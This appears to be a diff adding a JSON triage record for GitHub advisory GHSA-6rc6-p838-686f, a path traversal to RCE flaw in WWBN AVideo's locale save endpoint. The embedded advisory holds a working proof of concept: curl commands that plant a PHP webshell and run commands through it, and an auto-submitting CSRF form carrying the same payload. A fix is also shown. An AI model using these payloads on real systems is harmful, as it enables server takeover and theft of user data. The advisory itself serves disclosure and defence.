@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/114768995?v=4\", \"events_url\": \"https://api.github.com/users/offset/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/offset/followers\", \"following_url\": \"https://api.github.com/users/offset/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/offset/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/offset\", \"id\": 114768995, \"login\": \"offset\", \"node_id\": \"U_kgDOBtc8Yw\", \"organizations_url\": \"https://api.github.com/users/offset/orgs\", \"received_events_url\": \"https://api.github.com/users/offset/received_events\", \"repos_url\": \"https://api.github.com/users/offset/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/offset/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/offset/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/offset\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-40909\", \"cvss\": {\"score\": 8.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}], \"description\": \"## Summary\\n\\nThe locale save endpoint (`locale/save.php`) constructs a file path by directly concatenating `$_POST['flag']` into the path at line 30 without any sanitization. The `$_POST['code']` parameter is then written verbatim to that path via `fwrite()` at line 40. An admin attacker (or any user who can CSRF an admin, since no CSRF token is checked and cookies use `SameSite=None`) can traverse out of the `locale/` directory and write arbitrary `.php` files to any writable location on the filesystem, achieving Remote Code Execution.\\n\\n## Details\\n\\nIn `locale/save.php`, the vulnerable code path is:\\n\\n```php\\n// locale/save.php:10 — only auth check, no CSRF token\\nif (!User::isAdmin() || !empty($global['disableAdvancedConfigurations'])) {\\n    // ...\\n    die(json_encode($obj));\\n}\\n\\n// locale/save.php:16 — base directory\\n$dir = \\\"{$global['systemRootPath']}locale/\\\";\\n\\n// locale/save.php:30 — UNSANITIZED path concatenation\\n$file = $dir.($_POST['flag']).\\\".php\\\";\\n$myfile = fopen($file, \\\"w\\\") or die(\\\"Unable to open file!\\\");\\n\\n// locale/save.php:40 — UNSANITIZED content write\\nfwrite($myfile, $_POST['code']);\\n```\\n\\n**Root cause**: `$_POST['flag']` is concatenated directly into the file path with no call to `basename()`, `realpath()`, or any filtering of `../` sequences. A `flag` value like `../../shell` resolves to `{systemRootPath}locale/../../shell.php`, which escapes the locale directory and writes to `{systemRootPath}../shell.php` — the web-accessible parent directory.\\n\\nThe file content is constructed as:\\n```php\\n<?php\\nglobal $t;\\n{$_POST['code']}  // attacker-controlled, written verbatim\\n```\\n\\nAn attacker can inject arbitrary PHP after closing the translation context (e.g., `$t[\\\"x\\\"]=1;?><?php system($_GET[\\\"c\\\"]);`).\\n\\n**CSRF amplification**: The endpoint performs no CSRF token validation. AVideo intentionally sets `SameSite=None` on session cookies (for cross-origin iframe support), which means cross-site POST requests from an attacker's page will include the admin's session cookie, making CSRF exploitation trivial.\\n\\n## PoC\\n\\n**Direct exploitation (requires admin session):**\\n\\n```bash\\n# Step 1: Write a webshell outside locale/ to the webroot\\ncurl -b 'PHPSESSID=<admin_session>' \\\\\\n  -X POST 'https://target/locale/save.php' \\\\\\n  -d 'flag=../../webshell&code=$t[\\\"x\\\"]=1;?><%3fphp+system($_GET[\\\"c\\\"]);'\\n\\n# Step 2: Execute commands via the written webshell\\ncurl 'https://target/webshell.php?c=id'\\n# Response: uid=33(www-data) gid=33(www-data) ...\\n```\\n\\n**CSRF variant (no direct admin access needed):**\\n\\nHost the following HTML on an attacker-controlled site and lure an admin to visit:\\n\\n```html\\n<html>\\n<body>\\n<form method=\\\"POST\\\" action=\\\"https://target/locale/save.php\\\">\\n  <input type=\\\"hidden\\\" name=\\\"flag\\\" value=\\\"../../webshell\\\">\\n  <input type=\\\"hidden\\\" name=\\\"code\\\" value='$t[\\\"x\\\"]=1;?><?php system($_GET[\\\"c\\\"]);'>\\n</form>\\n<script>document.forms[0].submit();</script>\\n</body>\\n</html>\\n```\\n\\nAfter the admin visits the page, the attacker accesses `https://target/webshell.php?c=id` for RCE.\\n\\n## Impact\\n\\n- **Remote Code Execution**: An attacker can write arbitrary PHP code to any writable web-accessible directory, achieving full server compromise.\\n- **CSRF to RCE chain**: Because no CSRF token is required and `SameSite=None` is set, any user who can trick an admin into visiting a malicious page achieves unauthenticated RCE. This significantly expands the attack surface beyond admin-only.\\n- **Full server compromise**: With arbitrary PHP execution as the web server user, the attacker can read/modify the database, access all user data, pivot to other services, and potentially escalate privileges on the host.\\n\\n## Recommended Fix\\n\\nSanitize the `flag` parameter to prevent path traversal and add CSRF protection:\\n\\n```php\\n// locale/save.php — after the admin check at line 14\\n\\n// Add CSRF token validation\\nif (empty($_POST['token']) || !User::isValidToken($_POST['token'])) {\\n    $obj->status = 0;\\n    $obj->error = __(\\\"Invalid token\\\");\\n    die(json_encode($obj));\\n}\\n\\n// Sanitize flag to prevent path traversal\\n$flag = basename($_POST['flag']); // strip directory components\\nif (empty($flag) || preg_match('/[^a-zA-Z0-9_\\\\-]/', $flag)) {\\n    $obj->status = 0;\\n    $obj->error = __(\\\"Invalid locale flag\\\");\\n    die(json_encode($obj));\\n}\\n\\n$file = $dir . $flag . \\\".php\\\";\\n\\n// Verify resolved path is within expected directory\\n$realDir = realpath($dir);\\n$realFile = realpath(dirname($file)) . '/' . basename($file);\\nif (strpos($realFile, $realDir) !== 0) {\\n    $obj->status = 0;\\n    $obj->error = __(\\\"Invalid file path\\\");\\n    die(json_encode($obj));\\n}\\n```\\n\\nAdditionally, the `code` parameter should be validated to ensure it only contains translation assignments (`$t[...] = ...;`) and does not include PHP opening/closing tags or arbitrary code.\", \"epss\": {\"percentage\": 0.00656, \"percentile\": 0.4654}, \"ghsa_id\": \"GHSA-6rc6-p838-686f\", \"github_reviewed_at\": \"2026-04-14T22:49:48Z\", \"html_url\": \"https://github.com/advisories/GHSA-6rc6-p838-686f\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-6rc6-p838-686f\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-40909\"}], \"nvd_published_at\": \"2026-04-21T20:17:03Z\", \"published_at\": \"2026-04-14T22:49:48Z\", \"references\": [\"https://github.com/WWBN/AVideo/security/advisories/GHSA-6rc6-p838-686f\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-40909\", \"https://github.com/WWBN/AVideo/commit/57f89ffbc27d37c9d9dd727212334846e78ac21a\", \"https://github.com/advisories/GHSA-6rc6-p838-686f\"], \"repository_advisory_url\": \"https://api.github.com/repos/WWBN/AVideo/security-advisories/GHSA-6rc6-p838-686f\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/WWBN/AVideo\", \"summary\": \"WWBN AVideo has a Path Traversal in Locale Save Endpoint Enables Arbitrary PHP File Write to Any Web-Accessible Directory (RCE)\", \"type\": \"reviewed\", \"updated_at\": \"2026-04-24T20:30:17Z\", \"url\": \"https://api.github.com/advisories/GHSA-6rc6-p838-686f\", \"vulnerabilities\": [{\"first_patched_version\": null, \"package\": {\"ecosystem\": \"composer\", \"name\": \"wwbn/avideo\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 29.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-6rc6-p838-686f",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "wwbn/avideo: <= 29.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-40909"
+    ],
+    "cvss_score": 8.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "wwbn/avideo"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:04.893719Z",
+  "provenance": {
+    "content_sha256": "a7e5e044e340c45b380b39812eb58ef7642dacca1d4064f3cf452584cb182a67",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-14T22:49:48Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-6rc6-p838-686f",
+  "status": "active",
+  "title": "WWBN AVideo has a Path Traversal in Locale Save Endpoint Enables Arbitrary PHP File Write to Any Web-Accessible Directory (RCE)",
+  "updated_at": "2026-04-24T20:30:17Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-6rc6-p838-686f"
+}
